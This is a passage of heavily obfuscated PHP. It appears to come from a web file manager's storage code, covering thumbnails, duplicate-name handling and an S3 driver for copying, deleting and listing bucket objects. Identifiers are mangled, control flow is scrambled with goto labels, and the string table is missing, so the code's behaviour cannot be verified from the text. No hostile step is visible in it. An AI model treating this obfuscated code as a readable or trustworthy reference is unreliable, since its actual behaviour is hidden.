!function_exists($D¿—£çóãÛ[167]) || $AĞ£È¤ƒ[$D¿—£çóãÛ[168]] == $D¿—£çóãÛ[169]) { return $this->fileOut($c®Êùª×´, !1, $C¶ö„Û»á); } if (isset($AĞ£È¤ƒ[$D¿—£çóãÛ[164]][$D¿—£çóãÛ[170]])) { $A™åÑ®ç™¤ = $AĞ£È¤ƒ[$D¿—£çóãÛ[164]][$D¿—£çóãÛ[170]]; } else { if (isset($AĞ£È¤ƒ[$D¿—£çóãÛ[164]][$D¿—£çóãÛ[171]])) { $A™åÑ®ç™¤ = $AĞ£È¤ƒ[$D¿—£çóãÛ[164]][$D¿—£çóãÛ[171]]; } else { $A™åÑ®ç™¤ = md5("{$AĞ£È¤ƒ[$D¿—£çóãÛ[28]]}\137{$AĞ£È¤ƒ[$D¿—£çóãÛ[76]]}\x5f{$AĞ£È¤ƒ[$D¿—£çóãÛ[78]]}"); } } goto cï‰¥½ŠÉ†; eçâÁ×àÉ: $AĞ£È¤ƒ = $this->info($c®Êùª×´); $C¶ö„Û»á = $AĞ£È¤ƒ[$D¿—£çóãÛ[28]]; $a»ˆ°‚ÓÉ = !1; goto b¸††‡£Ó¡; cïÎ¾Š: $D¿—£çóãÛ =& $_SERVER[Ïº«‚ßèÔˆø]; set_timeout(); if (substr($c®Êùª×´, 0, 4) == $D¿—£çóãÛ[147]) { $this->fileOutLink($c®Êùª×´); } goto eçâÁ×àÉ; e…ÍÏÆØùà: if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $fÌÈñÊ÷Û = DATA_THUMB . $dßê²¨ŸíÚ; del_file($fÌÈñÊ÷Û); goto DºëÂ¾Ê†¬; DºëÂ¾Ê†¬: if (!@file_exists($fÌÈñÊ÷Û)) { $E®®êªí× = TEMP_FILES; if (!is_dir($E®®êªí×)) { mk_dir($E®®êªí×); } $d†ªˆŞå¡ = $E®®êªí× . $A™åÑ®ç™¤ . $D¿—£çóãÛ[95] . $AĞ£È¤ƒ[$D¿—£çóãÛ[168]]; if (!@file_exists($d†ªˆŞå¡)) { $d†ªˆŞå¡ = $this->download($c®Êùª×´, $d†ªˆŞå¡); } ImageThumb::createThumb($d†ªˆŞå¡, $fÌÈñÊ÷Û, $EŠºë‹Œñ, $EŠºë‹Œñ * 10); } if (!file_exists($fÌÈñÊ÷Û) || filesize($fÌÈñÊ÷Û) < 100) { return @file_exists($d†ªˆŞå¡) ? IO::fileOut($d†ªˆŞå¡) : $this->fileOut($c®Êùª×´); } if (!($A«§³ÎÌ—Ö = IO::move($fÌÈñÊ÷Û, $E¼°ª‡–¦))) { return IO::fileOut($fÌÈñÊ÷Û); } goto c„˜ğÙƒ½‘; fŸÌğÖÕÓŒ: } public function fileOutImageServer($cí¦¬ Óëİ, $B¤½Üè´… = 250) { $this->fileOutImage($cí¦¬ Óëİ, $B¤½Üè´…); } public function fileNameAuto($cåîä–¤¿×, $B‡œÉ’Óí, $Fˆ‘Ñ‰çÛÑ = REPEAT_RENAME, $A›Äì‰…Ø = false) { goto b½ìÜàšÉÜ; b½ìÜàšÉÜ: $DØ¾ØóÃ†¥ =& $_SERVER[Ïº«‚ßèÔˆø]; $a‰Ã¯²ò = $cåîä–¤¿× === $DØ¾ØóÃ†¥[33] ? $B‡œÉ’Óí : rtrim($cåîä–¤¿×, $DØ¾ØóÃ†¥[8]) . $DØ¾ØóÃ†¥[8] . $B‡œÉ’Óí; if ($Fˆ‘Ñ‰çÛÑ == REPEAT_REPLACE || !$this->exist($a‰Ã¯²ò) || $A›Äì‰…Ø && $Fˆ‘Ñ‰çÛÑ != REPEAT_RENAME_FOLDER) { return $B‡œÉ’Óí; } goto e¸ƒ‡šîââ; CÏ¿­¨¥à: $dÃ¯Ï’†Û = 1; $bÁñÜ‘ß‰Í = substr($B‡œÉ’Óí, 0, strlen($B‡œÉ’Óí) - strlen($Fğ­Âë‘»ø)); $CŠ£î¡‹ = $bÁñÜ‘ß‰Í . "\50{$dÃ¯Ï’†Û}\51{$Fğ­Âë‘»ø}"; goto Cğ¡÷îÑğÏ; e¸ƒ‡šîââ: if ($Fˆ‘Ñ‰çÛÑ == REPEAT_SKIP) { return !1; } $Fğ­Âë‘»ø = $DØ¾ØóÃ†¥[95] . get_path_ext($B‡œÉ’Óí); $Fğ­Âë‘»ø = $Fğ­Âë‘»ø == $DØ¾ØóÃ†¥[95] || $A›Äì‰…Ø ? $DØ¾ØóÃ†¥[33] : $Fğ­Âë‘»ø; goto CÏ¿­¨¥à; Cğ¡÷îÑğÏ: while ($this->exist(rtrim($cåîä–¤¿×, $DØ¾ØóÃ†¥[8]) . $DØ¾ØóÃ†¥[8] . $CŠ£î¡‹)) { $CŠ£î¡‹ = $bÁñÜ‘ß‰Í . "\50{$dÃ¯Ï’†Û}\x29{$Fğ­Âë‘»ø}"; $dÃ¯Ï’†Û++; } return $CŠ£î¡‹; goto f¾öæ¦ÑôË; f¾öæ¦ÑôË: } private function fileNameAutoList($BòÉ„ìŒËˆ, $Eêç ²¸Ó, $AÈµÎÈµ©ø = false) { goto d–±£Ó÷èÅ; b‡‚ºñ‚±Â: return $DÅŠ«×ÀÅ; goto BÜ´­ç«¯Æ; E™ŸÖç: $bä¾Õé·ÒÈ = substr($Eêç ²¸Ó, 0, strlen($Eêç ²¸Ó) - strlen($a‘ÕèŠŒ)); $DÅŠ«×ÀÅ = $bä¾Õé·ÒÈ . "\50\x30\51{$a‘ÕèŠŒ}"; for ($EÅ³áÀŠŠ = 1; $EÅ³áÀŠŠ <= count($D¤º™ëÁô) + 1; $EÅ³áÀŠŠ++) { $DÅŠ«×ÀÅ = $bä¾Õé·ÒÈ . "\50{$EÅ³áÀŠŠ}\51{$a‘ÕèŠŒ}"; if (!in_array_not_case($DÅŠ«×ÀÅ, $D¤º™ëÁô)) { return $DÅŠ«×ÀÅ; } } goto b‡‚ºñ‚±Â; E©ƒ„¬¸Ò: $D¤º™ëÁô = array_to_keyvalue($bÖˆšíÙ‘Ã, $eÄÈÒéäÇ½[33], $eÄÈÒéäÇ½[28]); $a‘ÕèŠŒ = $eÄÈÒéäÇ½[95] . get_path_ext($Eêç ²¸Ó); $a‘ÕèŠŒ = $a‘ÕèŠŒ == $eÄÈÒéäÇ½[95] || $AÈµÎÈµ©ø ? $eÄÈÒéäÇ½[33] : $a‘ÕèŠŒ; goto E™ŸÖç; d–±£Ó÷èÅ: $eÄÈÒéäÇ½ =& $_SERVER[Ïº«‚ßèÔˆø]; $bÖˆšíÙ‘Ã = $this->listPath($BòÉ„ìŒËˆ, !0); $bÖˆšíÙ‘Ã = array_merge($bÖˆšíÙ‘Ã[$eÄÈÒéäÇ½[75]], $bÖˆšíÙ‘Ã[$eÄÈÒéäÇ½[74]]); goto E©ƒ„¬¸Ò; BÜ´­ç«¯Æ: } public function listAllFiles($Bí†ì£ˆ¨, $cä¹ƒ‹Åš¦, $CÕ³á²‚ğÒ = array()) { goto f³¿“¨‰¸×; b—± —Ö´Í: foreach (array_unique($Dº¾‡¼“¢¯) as $e˜£“Ù¼Òƒ) { $Eœ™Ÿ—–¥‚ = array($fî‘„Ø¨ö[76] => $this->getPathOuter($fî‘„Ø¨ö[8] . $Bí†ì£ˆ¨ . $fî‘„Ø¨ö[8] . $e˜£“Ù¼Òƒ), $fî‘„Ø¨ö[77] => 1, $fî‘„Ø¨ö[78] => 0); if (substr($e˜£“Ù¼Òƒ, -1) != $fî‘„Ø¨ö[8]) { $Eœ™Ÿ—–¥‚[$fî‘„Ø¨ö[77]] = 0; $C¸×†‹ŒŞ÷ = $this->getPath($Bí†ì£ˆ¨ . $fî‘„Ø¨ö[8] . $e˜£“Ù¼Òƒ); $Eœ™Ÿ—–¥‚[$fî‘„Ø¨ö[78]] = isset($CÕ³á²‚ğÒ[$C¸×†‹ŒŞ÷]) ? $CÕ³á²‚ğÒ[$C¸×†‹ŒŞ÷] : $this->size($C¸×†‹ŒŞ÷); } $AÓÜ´é»ªË[] = $Eœ™Ÿ—–¥‚; } return $AÓÜ´é»ªË; goto d„©±‹‹®; f³¿“¨‰¸×: $fî‘„Ø¨ö =& $_SERVER[Ïº«‚ßèÔˆø]; if (empty($cä¹ƒ‹Åš¦)) { return array(); } $Dº¾‡¼“¢¯ = array(); goto d™—¡æ‹™; d™—¡æ‹™: $Bí†ì£ˆ¨ = trim($Bí†ì£ˆ¨, $fî‘„Ø¨ö[8]); foreach ($cä¹ƒ‹Åš¦ as $e˜£“Ù¼Òƒ) { $f¢ÜÕåØ¿ = ltrim(substr(trim($e˜£“Ù¼Òƒ, $fî‘„Ø¨ö[8]), strlen($Bí†ì£ˆ¨)), $fî‘„Ø¨ö[8]); $Dº¾‡¼“¢¯ = array_merge($Dº¾‡¼“¢¯, $this->slicePath($f¢ÜÕåØ¿)); } $AÓÜ´é»ªË = array(); goto b—± —Ö´Í; d„©±‹‹®: } public function slicePath($Cæ£à–†í) { $e™ãà¬°‹¿ =& $_SERVER[Ïº«‚ßèÔˆø]; $BÇ­†âñ¤Ÿ = explode($e™ãà¬°‹¿[8], trim($Cæ£à–†í, $e™ãà¬°‹¿[8])); $AËŸ® î = 0; do { ++$AËŸ® î; $a¸ğÒÇÍÍ‚[] = implode($e™ãà¬°‹¿[8], array_slice($BÇ­†âñ¤Ÿ, 0, $AËŸ® î)) . $e™ãà¬°‹¿[8]; } while ($AËŸ® î < count($BÇ­†âñ¤Ÿ)); $a¸ğÒÇÍÍ‚[count($BÇ­†âñ¤Ÿ) - 1] = $Cæ£à–†í; return $a¸ğÒÇÍÍ‚; } public function getHost() { $eİ—‹Ú =& $_SERVER[Ïº«‚ßèÔˆø]; $CÈ½ÔæÇë = parse_url(trim($this->domain, $eİ—‹Ú[8])); $cÕ®ëèÓŒÕ = isset($CÈ½ÔæÇë[$eİ—‹Ú[174]]) ? $CÈ½ÔæÇë[$eİ—‹Ú[174]] : http_type(); $F°à·Öäù = isset($CÈ½ÔæÇë[$eİ—‹Ú[175]]) ? $CÈ½ÔæÇë[$eİ—‹Ú[175]] : $CÈ½ÔæÇë[$eİ—‹Ú[76]]; if (isset($CÈ½ÔæÇë[$eİ—‹Ú[176]])) { $F°à·Öäù .= $eİ—‹Ú[4] . $CÈ½ÔæÇë[$eİ—‹Ú[176]]; } return $cÕ®ëèÓŒÕ . $eİ—‹Ú[177] . $F°à·Öäù; } public function pathEncode($B—»Ş‡¥è„) { $bºî¨°×åÌ =& $_SERVER[Ïº«‚ßèÔˆø]; return str_replace($bºî¨°×åÌ[178], $bºî¨°×åÌ[8], rawurlencode($B—»Ş‡¥è„)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($fß¨Ôˆ©¿Ã) { set_timeout(); require_once SDK_DIR . $_SERVER[Ïº«‚ßèÔˆø][179]; parent::__construct(); $this->_init($fß¨Ôˆ©¿Ã); } public function _init($EÖâÃÇÑÃ‡) { foreach ($EÖâÃÇÑÃ‡ as $aá öÂÙ³ => $fÀÔ“Á”‰) { if (isset($this->{$aá öÂÙ³})) { $this->{$aá öÂÙ³} = $fÀÔ“Á”‰; } } $this->endpoint = $EÖâÃÇÑÃ‡[$_SERVER[Ïº«‚ßèÔˆø][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($B—¸¶Òñ” = "\x76\x34") { $this->signVer = $B—¸¶Òñ”; $this->client->setSignatureVersion($B—¸¶Òñ”); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto EâêôŠÁ¡’; dÁÁ£î³: if ($F„ªì¼ŸÜõ[$a–ôíÁƒÚ™[181]] != $a–ôíÁƒÚ™[182] || $F„ªì¼ŸÜõ[$a–ôíÁƒÚ™[183]] != $a–ôíÁƒÚ™[182]) { return !1; } $e÷…à×§î = array_map($a–ôíÁƒÚ™[184], $F„ªì¼ŸÜõ[$a–ôíÁƒÚ™[185]]); if (!is_array($e÷…à×§î)) { $e÷…à×§î = array(); } goto A©°ÜÛ®‰; EâêôŠÁ¡’: $a–ôíÁƒÚ™ =& $_SERVER[Ïº«‚ßèÔˆø]; $F„ªì¼ŸÜõ = $this->getBucketCors(); if (!$F„ªì¼ŸÜõ || !is_array($F„ªì¼ŸÜõ)) { return !1; } goto dÁÁ£î³; A©°ÜÛ®‰: $b½¶ ĞáÈ‡ = array($a–ôíÁƒÚ™[186], $a–ôíÁƒÚ™[187], $a–ôíÁƒÚ™[188], $a–ôíÁƒÚ™[189], $a–ôíÁƒÚ™[190]); $c¼Ò ÄÊ‰è = array_diff($b½¶ ĞáÈ‡, $e÷…à×§î); return empty($c¼Ò ÄÊ‰è); goto a‚““‘ÀØ»; a‚““‘ÀØ»: } public function mkfile($EÚæ”ä‡Ü¸, $a¶îÜùÄ«Ï = '', $CŒĞöŠÔ†› = REPEAT_RENAME) { $DùƒÇù´ï = $this->setContent($EÚæ”ä‡Ü¸, $a¶îÜùÄ«Ï); if ($DùƒÇù´ï !== !1) { return $this->getPathOuter($EÚæ”ä‡Ü¸); } return !1; } public function mkdir($e™ô‘Íï¦ , $cÁ’Š ŞÙÆ = REPEAT_SKIP) { if (empty($e™ô‘Íï¦ )) { return !1; } if ($this->_isFolder($e™ô‘Íï¦ )) { return $this->getPathOuter($e™ô‘Íï¦ ); } $fÏò¡›Ã¥ò = $this->setContent($e™ô‘Íï¦ , $_SERVER[Ïº«‚ßèÔˆø][33], !0); if ($fÏò¡›Ã¥ò !== !1) { return $this->getPathOuter($e™ô‘Íï¦ ); } return !1; } public function copyFile($açĞ¥‡ö…Ó, $b¹¼áŠ™©˜, $cŠØ«ÌĞçò = array()) { $dİ„å’æó =& $_SERVER[Ïº«‚ßèÔˆø]; $B÷Õî‚Ë¥é = $this->objectMeta($açĞ¥‡ö…Ó); if (!$B÷Õî‚Ë¥é) { return !1; } if ($B÷Õî‚Ë¥é[$dİ„å’æó[78]] <= 1024 * 1024 * 200) { $fÔ¼õ›³Á = $this->client->copyObject($this->bucket, $açĞ¥‡ö…Ó, $this->bucket, $b¹¼áŠ™©˜, $dİ„å’æó[191], $cŠØ«ÌĞçò); } else { $fÔ¼õ›³Á = $this->client->multiCopyObject($this->bucket, $açĞ¥‡ö…Ó, $this->bucket, $b¹¼áŠ™©˜, $cŠØ«ÌĞçò); } $fÔ¼õ›³Á = $fÔ¼õ›³Á ? $this->getPathOuter($b¹¼áŠ™©˜) : !1; return $fÔ¼õ›³Á; } public function moveFile($cì—¯éìô, $b³‹†©Ÿ‹–) { if ($this->copyFile($cì—¯éìô, $b³‹†©Ÿ‹–)) { $this->delFile($cì—¯éìô); return $this->getPathOuter($b³‹†©Ÿ‹–); } return !1; } public function delFile($eÕ÷Å¼Á‡) { return $this->client->deleteObject($this->bucket, $eÕ÷Å¼Á‡); } public function delFolder($b‹éñÇÑŞŸ) { goto B¤ÓÈ¬ãÇ×; FŸ¢ÛÓÄŸ: return $this->delByBatch($AŞå„ô´®›[$eÇ÷£³Àï[75]]); goto f•ª¡‚„¤ª; dËâ‘°Çİø: $AŞå„ô´®› = $this->fileList($b‹éñÇÑŞŸ); $this->listItemCache = !0; $dº¯·ò’»Ë = trim($b‹éñÇÑŞŸ, $eÇ÷£³Àï[8]) . $eÇ÷£³Àï[8]; goto Aõ›÷ç”š; Aõ›÷ç”š: if (!empty($b‹éñÇÑŞŸ) && !in_array($dº¯·ò’»Ë, $AŞå„ô´®›[$eÇ÷£³Àï[75]])) { $AŞå„ô´®›[$eÇ÷£³Àï[75]][] = $dº¯·ò’»Ë; } $Fù‰†‰²‡» = $this->delByBatch($AŞå„ô´®›[$eÇ÷£³Àï[74]]); if (!$Fù‰†‰²‡») { return !1; } goto FŸ¢ÛÓÄŸ; B¤ÓÈ¬ãÇ×: $eÇ÷£³Àï =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$this->exist($b‹éñÇÑŞŸ)) { return !0; } $this->listItemCache = !1; goto dËâ‘°Çİø; f•ª¡‚„¤ª: } private function delByBatch($bÂİš©ŒßÌ) { foreach (array_chunk($bÂİš©ŒßÌ, 1000) as $FâĞò¥¹ˆ‡) { $dˆ¦ÉõÏ ‘ = $this->client->deleteObjects($this->bucket, $FâĞò¥¹ˆ‡); if (!$dˆ¦ÉõÏ ‘) { return !1; } } return !0; } public function rename($F—ßÅ‰ö¥, $bŒÏƒ¼øºÛ) { return $this->renameObject($F—ßÅ‰ö¥, $bŒÏƒ¼øºÛ); } public function listPath($A¿‰æ÷•èí, $dÜ×‘È„Ë = false) { $câöÑ§ê”· =& $_SERVER[Ïº«‚ßèÔˆø]; $cøàŸŠ¶ÖÌ = $this->fileList($A¿‰æ÷•èí, $câöÑ§ê”·[8], !0); foreach ($cøàŸŠ¶ÖÌ[$câöÑ§ê”·[75]] as $dÊ®¬İù½ => $FÈÆ”å¥ßÔ) { $cøàŸŠ¶ÖÌ[$câöÑ§ê”·[75]][$dÊ®¬İù½] = $this->folderInfo($FÈÆ”å¥ßÔ, $dÜ×‘È„Ë); } foreach ($cøàŸŠ¶ÖÌ[$câöÑ§ê”·[74]] as $dÊ®¬İù½ => $FÈÆ”å¥ßÔ) { $cøàŸŠ¶ÖÌ[$câöÑ§ê”·[74]][$dÊ®¬İù½] = $this->fileInfo($FÈÆ”å¥ßÔ[$câöÑ§ê”·[28]], $dÜ×‘È„Ë, $FÈÆ”å¥ßÔ); } return $cøàŸŠ¶ÖÌ; } private function fileInfo($b’ÌïÒÎã, $C‚ÔíÍ«ˆ± = false, $f¢Ì¼’Ğ¨ = array()) { goto BŒÍÂ„™´; BŒÍÂ„™´: $EÚùŠŒÔ¿ê =& $_SERVER[Ïº«‚ßèÔˆø]; $B¦ƒ ïĞ¸ = array($EÚùŠŒÔ¿ê[28] => $this->pathThis($b’ÌïÒÎã), $EÚùŠŒÔ¿ê[76] => $this->getPathOuter($b’ÌïÒÎã), $EÚùŠŒÔ¿ê[29] => $EÚùŠŒÔ¿ê[192], $EÚùŠŒÔ¿ê[168] => $this->ext($b’ÌïÒÎã), $EÚùŠŒÔ¿ê[78] => isset($f¢Ì¼’Ğ¨[$EÚùŠŒÔ¿ê[78]]) ? $f¢Ì¼’Ğ¨[$EÚùŠŒÔ¿ê[78]] : 0); if ($C‚ÔíÍ«ˆ±) { return $B¦ƒ ïĞ¸; } goto cïÂ°é§Ì«; F‘á‚¹¾ç¬: if (isset($f¢Ì¼’Ğ¨[$EÚùŠŒÔ¿ê[196]])) { $B¦ƒ ïĞ¸[$EÚùŠŒÔ¿ê[84]] = $f¢Ì¼’Ğ¨[$EÚùŠŒÔ¿ê[196]]; } if (isset($f¢Ì¼’Ğ¨[$EÚùŠŒÔ¿ê[78]])) { $B¦ƒ ïĞ¸[$EÚùŠŒÔ¿ê[78]] = $f¢Ì¼’Ğ¨[$EÚùŠŒÔ¿ê[78]]; } return $B¦ƒ ïĞ¸; goto cëõïĞµğŠ; cïÂ°é§Ì«: $B¦ƒ ïĞ¸[$EÚùŠŒÔ¿ê[193]] = $B¦ƒ ïĞ¸[$EÚùŠŒÔ¿ê[84]] = 0; $B¦ƒ ïĞ¸[$EÚùŠŒÔ¿ê[194]] = $B¦ƒ ïĞ¸[$EÚùŠŒÔ¿ê[195]] = !0; if (empty($f¢Ì¼’Ğ¨)) { $f¢Ì¼’Ğ¨ = $this->objectMeta($b’ÌïÒÎã); if (!$f¢Ì¼’Ğ¨) { return $B¦ƒ ïĞ¸; } } goto F‘á‚¹¾ç¬; cëõïĞµğŠ: } private function folderInfo($cÇòÓ·õËà, $Eœº½²³Èõ = false) { goto aŠå”îé±é; d‚Ëœ°Ú’ª: $eˆ¹ÒƒŸËÓ[$A­›Ù¹‚½[193]] = $eˆ¹ÒƒŸËÓ[$A­›Ù¹‚½[84]] = 0; $eˆ¹ÒƒŸËÓ[$A­›Ù¹‚½[194]] = $eˆ¹ÒƒŸËÓ[$A­›Ù¹‚½[195]] = !0; if ($cÇòÓ·õËà == $A­›Ù¹‚½[33]) { return $eˆ¹ÒƒŸËÓ; } goto B¾÷›ç‡Ş‘; bÃ‡æÅ¨: return $eˆ¹ÒƒŸËÓ; goto AŠ®Êºíéø; aŠå”îé±é: $A­›Ù¹‚½ =& $_SERVER[Ïº«‚ßèÔˆø]; $eˆ¹ÒƒŸËÓ = array($A­›Ù¹‚½[28] => $this->pathThis($cÇòÓ·õËà), $A­›Ù¹‚½[76] => $this->getPathOuter($A­›Ù¹‚½[8] . $cÇòÓ·õËà), $A­›Ù¹‚½[29] => $A­›Ù¹‚½[77]); if ($Eœº½²³Èõ) { return $eˆ¹ÒƒŸËÓ; } goto d‚Ëœ°Ú’ª; B¾÷›ç‡Ş‘: $cÇòÓ·õËà = trim($cÇòÓ·õËà, $A­›Ù¹‚½[8]) . $A­›Ù¹‚½[8]; $c«âéØ±â = $this->objectMeta($cÇòÓ·õËà); if (isset($c«âéØ±â[$A­›Ù¹‚½[196]])) { $eˆ¹ÒƒŸËÓ[$A­›Ù¹‚½[193]] = $c«âéØ±â[$A­›Ù¹‚½[196]]; } goto bÃ‡æÅ¨; AŠ®Êºíéø: } private function fileList($aØíî‡‡À, $C¦ó¾¾Ê = '', $e•’ÉßÇ´Î = 0) { goto fï±ø¢®½­; fï±ø¢®½­: $c±ˆÉí–À© =& $_SERVER[Ïº«‚ßèÔˆø]; $CòË‰¡Ùà¾ = rtrim($aØíî‡‡À, $c±ˆÉí–À©[8]) . $c±ˆÉí–À©[8]; $eÃÂ¦¯½†Ş = $this->listObjs($CòË‰¡Ùà¾, null, null, $C¦ó¾¾Ê); goto d‹’³¾àœ; Dƒ•Š³ê“æ: return array($c±ˆÉí–À©[75] => $Aè±á¤´Û, $c±ˆÉí–À©[74] => $DáóŒË‡©ã); goto c”ÈÂ–™¾†; d‹’³¾àœ: if (!$eÃÂ¦¯½†Ş) { return array($c±ˆÉí–À©[75] => array(), $c±ˆÉí–À©[74] => array()); } $dã‚ğ±Ä† = $this->listItemCache === !1 ? !1 : !0; $Aè±á¤´Û = $DáóŒË‡©ã = array(); goto aëÚ¸èê¸è; aëÚ¸èê¸è: foreach ($eÃÂ¦¯½†Ş[$c±ˆÉí–À©[197]] as $a¤ä›–”É‹) { goto B˜ˆĞÀ‡¸; B˜ˆĞÀ‡¸: $bçÍ©Ä¨‘» = $a¤ä›–”É‹[$c±ˆÉí–À©[28]]; if ($bçÍ©Ä¨‘» == $CòË‰¡Ùà¾) { continue; } $E¶ÀÛ…‘ƒŠ = isset($a¤ä›–”É‹[$c±ˆÉí–À©[78]]) ? $a¤ä›–”É‹[$c±ˆÉí–À©[78]] : 0; goto B„¸ÀŠ×¸’; B„¸ÀŠ×¸’: $B™ÁâŸÙ§Í = $E¶ÀÛ…‘ƒŠ == 0 && substr($bçÍ©Ä¨‘», strlen($bçÍ©Ä¨‘») - 1, 1) == $c±ˆÉí–À©[8] ? !0 : !1; if ($dã‚ğ±Ä†) { $this->cacheMethod($c±ˆÉí–À©[198], $bçÍ©Ä¨‘», $B™ÁâŸÙ§Í); $this->cacheMethod($c±ˆÉí–À©[199], $bçÍ©Ä¨‘», $a¤ä›–”É‹); } if ($B™ÁâŸÙ§Í) { $Aè±á¤´Û[] = $bçÍ©Ä¨‘»; continue; } goto dÌâæÊµ‚ö; dÌâæÊµ‚ö: $DáóŒË‡©ã[] = $e•’ÉßÇ´Î ? $a¤ä›–”É‹ : $bçÍ©Ä¨‘»; goto F³ÏÏ‘„Ã; F³ÏÏ‘„Ã: } foreach ($eÃÂ¦¯½†Ş[$c±ˆÉí–À©[200]] as $a¤ä›–”É‹) { $Aè±á¤´Û[] = $a¤ä›–”É‹[$c±ˆÉí–À©[28]]; if ($dã‚ğ±Ä†) { $this->cacheMethod($c±ˆÉí–À©[198], $a¤ä›–”É‹[$c±ˆÉí–À©[28]], !0); } } if ($dã‚ğ±Ä†) { $this->cacheMethod($c±ˆÉí–À©[198], $aØíî‡‡À, !0); } goto Dƒ•Š³ê“æ; c”ÈÂ–™¾†: } private function listObjs($b©‘ê”÷Ü, $d¥ÂÔŠíÒ = null, $A´“ø¾Ò† = null, $aƒÌ†Í‰‡¾ = null) { $bãºÖØËÈ =& $_SERVER[Ïº«‚ßèÔˆø]; $b©‘ê”÷Ü = trim($b©‘ê”÷Ü, $bãºÖØËÈ[8]); $BÖ…ÎÃ‰á£ = empty($b©‘ê”÷Ü) ? $bãºÖØËÈ[33] : $b©‘ê”÷Ü . $bãºÖØËÈ[8]; return $this->client->getBucket($this->bucket, $BÖ…ÎÃ‰á£, $d¥ÂÔŠíÒ, $A´“ø¾Ò†, $aƒÌ†Í‰‡¾, !0); } public function has($CøƒÊŸ¶Ñ, $dÁÈ‡Ãá ö = false, $Dö—¤ó¨¹» = true) { goto Aº§ÚïÀçĞ; Aº§ÚïÀçĞ: $aÓÒ‹…Û× =& $_SERVER[Ïº«‚ßèÔˆø]; $CøƒÊŸ¶Ñ = trim($CøƒÊŸ¶Ñ, $aÓÒ‹…Û×[8]); $añƒ±ªÒŞ = empty($CøƒÊŸ¶Ñ) ? $aÓÒ‹…Û×[33] : $CøƒÊŸ¶Ñ . $aÓÒ‹…Û×[8]; goto A¥Ò´·Ö; A¥Ò´·Ö: $dÕ‰™è‡ƒÔ = null; $B™‘‡â¶øµ = 500; $cÉ¿Ÿ¤ğ• = $aÓÒ‹…Û×[8]; goto Cò‡‡×İÚê; Cò‡‡×İÚê: $BØ£·¯ á‚ = $E×¨¤£šÌ— = array(); while (!0) { $aßÇÈÒºï– = $this->listObjs($CøƒÊŸ¶Ñ, $dÕ‰™è‡ƒÔ, $B™‘‡â¶øµ, $cÉ¿Ÿ¤ğ•); if (!$aßÇÈÒºï–) { break; } $dÕ‰™è‡ƒÔ = $aßÇÈÒºï–[$aÓÒ‹…Û×[201]]; $fí –³ÄñÆ = $aßÇÈÒºï–[$aÓÒ‹…Û×[197]]; $F”ù»èˆÚâ = $aßÇÈÒºï–[$aÓÒ‹…Û×[200]]; if (empty($fí –³ÄñÆ) && empty($F”ù»èˆÚâ)) { break; } if (count($fí –³ÄñÆ) == 1 && $fí –³ÄñÆ[0][$aÓÒ‹…Û×[28]] == $añƒ±ªÒŞ) { break; } if ($dÁÈ‡Ãá ö) { if (count($fí –³ÄñÆ)) { $fí –³ÄñÆ = array_column($fí –³ÄñÆ, $aÓÒ‹…Û×[28]); $BØ£·¯ á‚ = array_merge($BØ£·¯ á‚, $fí –³ÄñÆ); } if (count($F”ù»èˆÚâ)) { $F”ù»èˆÚâ = array_column($F”ù»èˆÚâ, $aÓÒ‹…Û×[28]); $E×¨¤£šÌ— = array_merge($E×¨¤£šÌ—, $F”ù»èˆÚâ); } if ($dÕ‰™è‡ƒÔ === null) { break; } continue; } if ($Dö—¤ó¨¹») { if (!empty($fí –³ÄñÆ)) { if (count($fí –³ÄñÆ) > 1 || isset($fí –³ÄñÆ[0][$aÓÒ‹…Û×[28]]) && $fí –³ÄñÆ[0][$aÓÒ‹…Û×[28]] != $añƒ±ªÒŞ) { return !0; } } } else { if (!empty($F”ù»èˆÚâ)) { return !0; } } if ($dÕ‰™è‡ƒÔ === null) { break; } } if ($dÁÈ‡Ãá ö) { $BØ£·¯ á‚ = array_diff($BØ£·¯ á‚, array($añƒ±ªÒŞ)); $BØ£·¯ á‚ = count(array_unique($BØ£·¯ á‚)); $E×¨¤£šÌ— = count(array_unique($E×¨¤£šÌ—)); return array($aÓÒ‹…Û×[202] => $BØ£·¯ á‚, $aÓÒ‹…Û×[203] => $E×¨¤£šÌ—); } goto d©Â•ù‘Ş; d©Â•ù‘Ş: return !1; goto eê„Ğ‘ğ°î; eê„Ğ‘ğ°î: } public function listAll($CÁˆ¤Ëã˜³) { $a˜Óğ¢»ïÍ =& $_SERVER[Ïº«‚ßèÔˆø]; $D—ä§Ñ¶…æ = $this->fileList($CÁˆ¤Ëã˜³, $a˜Óğ¢»ïÍ[33], !0); $f‚òÎÁ»åò = array(); foreach ($D—ä§Ñ¶…æ[$a˜Óğ¢»ïÍ[74]] as $Bçß°˜„­í) { $f‚òÎÁ»åò[$Bçß°˜„­í[$a˜Óğ¢»ïÍ[28]]] = $Bçß°˜„­í[$a˜Óğ¢»ïÍ[78]]; } foreach ($D—ä§Ñ¶…æ[$a˜Óğ¢»ïÍ[75]] as $Bçß°˜„­í) { if (is_string($Bçß°˜„­í)) { $f‚òÎÁ»åò[$Bçß°˜„­í] = 0; } } return $this->listAllFiles($CÁˆ¤Ëã˜³, array_keys($f‚òÎÁ»åò), $f‚òÎÁ»åò); } public function canRead($Fµ¶«ì”Ëõ) { $C‚ìêë»Üµ =& $_SERVER[Ïº«‚ßèÔˆø]; $C¹›’ì«Œ± = $this->client->getAccessControlPolicy($this->bucket, $Fµ¶«ì”Ëõ); if (!$C¹›’ì«Œ±) { return !1; } return in_array($C¹›’ì«Œ±, array($C‚ìêë»Üµ[204], $C‚ìêë»Üµ[205], $C‚ìêë»Üµ[206])) ? !0 : !1; } public function canWrite($fÆ¾ÎŠ¢Ã¨) { $fË’Ö†æà‚ =& $_SERVER[Ïº«‚ßèÔˆø]; $CÊÕö¤®÷ = $this->client->getAccessControlPolicy($this->bucket, $fÆ¾ÎŠ¢Ã¨); if (!$CÊÕö¤®÷) { return !1; } return in_array($CÊÕö¤®÷, array($fË’Ö†æà‚[204], $fË’Ö†æà‚[205])) ? !0 : !1; } public function 